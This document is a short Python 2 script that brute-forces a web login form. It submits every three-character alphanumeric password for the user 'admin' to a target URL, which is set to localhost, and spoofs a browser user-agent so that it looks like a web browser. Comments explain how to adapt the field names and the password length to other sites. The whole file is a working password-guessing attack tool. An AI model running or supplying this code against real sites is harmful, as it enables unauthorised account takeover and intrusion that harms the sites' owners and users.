#!/usr/bin/python
import itertools, time, os, urllib2, re, urllib
HOST = "http://localhost/index.php"  #Target site
USER = "admin"                       #The username
ERROR = "Denied"                     #The error message when we fail to log in
FORM_USER_VARIABLE = 'user'          #The variable that holds the username (you can find it in the source of the HTML login page)
FORM_PASS_VARIABLE = 'pass' 	     #The variable that holds the password (you can find it in the source of the HTML login page)

#below is the list of the characters we want to include. (a-z) lowercase, (A-Z) uppercase, (1-9) numbers

for word in itertools.imap(''.join, itertools.product('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', repeat=3)): #replace the "repeat=6" with "repeat=?", the ? is the length of characters, this value doesn't auto increment.

	#Create our form with the information provided from the web form
	login_form_seq = [
	(FORM_USER_VARIABLE, USER),
	(FORM_PASS_VARIABLE, word)]

	os.system("clear")
	print "[+] Current Pass Trying:",word

	#Encode the data using the urllib module.
	login_form_data = urllib.urlencode(login_form_seq)

	#Create an opener from the HOST variable.
	opener = urllib2.build_opener()

	#Add a user-agent so we look like a web browser.
	opener.addheaders = [('User-agent', 
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; de-de) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27')]

	#Get the source from the site using our form. 
	source = opener.open(HOST, login_form_data).read()

	if re.search(ERROR,source) == None:
		print "\n[+] Successful Login! \n[-] Username:",USER,"\n[-] Password:",word
		break
	# time.sleep( 1 )  # uncomment this to wait 1 second for each try
